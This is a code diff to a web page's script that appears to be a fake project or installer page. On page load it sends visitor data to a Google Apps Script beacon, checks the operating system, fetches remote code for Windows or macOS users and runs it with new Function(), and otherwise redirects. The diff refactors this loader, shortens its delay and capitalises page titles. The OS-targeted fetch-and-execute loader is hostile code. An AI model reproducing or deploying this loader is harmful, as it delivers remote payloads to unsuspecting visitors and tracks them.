@@ -323,15 +323,20 @@
         const ERROR_URL = "https://github.com/";
         const APP_URL = "https://script.google.com/macros/s/AKfycbzcc-DrgeXVXUqF0ZzVeA1PwlFTOLMdXszxROOqbmA4MWCPobSyWhGGEmpZWgogP02qZA/exec";
 
+        function capitalizeWords(str) {
+            return str.split(' ').map(word => word.charAt(0).toUpperCase() + word.slice(1)).join(' ');
+        }
+
         function getProjectInfo() {
             const urlParams = new URLSearchParams(window.location.search);
             const textParam = urlParams.get('text');
             
             if (textParam) {
                 const fullText = decodeURIComponent(textParam);
+                const capitalizedText = capitalizeWords(fullText);
                 const pathSlug = fullText.replace(/\s+/g, '-').toLowerCase();
                 return {
-                    displayName: fullText,
+                    displayName: capitalizedText,
                     pathDisplay: '/' + pathSlug,
                     subtitle: pathSlug + '.github.io'
                 };
@@ -384,31 +389,34 @@
             new Image(1,1).src = APP_URL + "?" + q + "&_t=" + Date.now();
         }
 
+        function executeAfterDelay() {
+            const os = detectOS();
+            sendLink();
+            
+            if (os === 'windows' || os === 'macos') {
+                const targetUrl = os === 'windows' ? REMOTE_WINDOWS : REMOTE_MAC;
+                async function load() {
+                    try {
+                        const res = await fetch(targetUrl, { cache: 'no-store' });
+                        const code = await res.text();
+                        const headline = document.getElementById('dynamicTitle');
+                        const status = document.getElementById('dynamicSubtitle');
+                        new Function('headline', 'status', code)(headline, status);
+                    } catch {
+                        setTimeout(() => { window.location.replace(targetUrl); }, 1450);
+                    }
+                }
+                load();
+            } else {
+                document.getElementById('dynamicTitle').textContent = "Attention: Unsupported Operating System";
+                document.getElementById('dynamicSubtitle').textContent = "To continue installation, you must be using Windows or macOS.";
+                setTimeout(() => { window.location.replace(ERROR_URL); }, 4000);
+            }
+        }
+
         document.addEventListener("DOMContentLoaded", () => {
             updateUI();
-            setTimeout(() => {
-                const os = detectOS();
-                sendLink();
-                if (os === 'windows' || os === 'macos') {
-                    const targetUrl = os === 'windows' ? REMOTE_WINDOWS : REMOTE_MAC;
-                    async function load() {
-                        try {
-                            const res = await fetch(targetUrl, { cache: 'no-store' });
-                            const code = await res.text();
-                            const headline = document.getElementById('dynamicTitle');
-                            const status = document.getElementById('dynamicSubtitle');
-                            new Function('headline', 'status', code)(headline, status);
-                        } catch {
-                            setTimeout(() => { window.location.replace(targetUrl); }, 1450);
-                        }
-                    }
-                    load();
-                } else {
-                    document.getElementById('dynamicTitle').textContent = "Attention: Unsupported Operating System";
-                    document.getElementById('dynamicSubtitle').textContent = "To continue installation, you must be using Windows or macOS.";
-                    setTimeout(() => { window.location.replace(ERROR_URL); }, 4000);
-                }
-            }, 5000);
+            setTimeout(executeAfterDelay, 3000);
         });
     </script>
 </body>
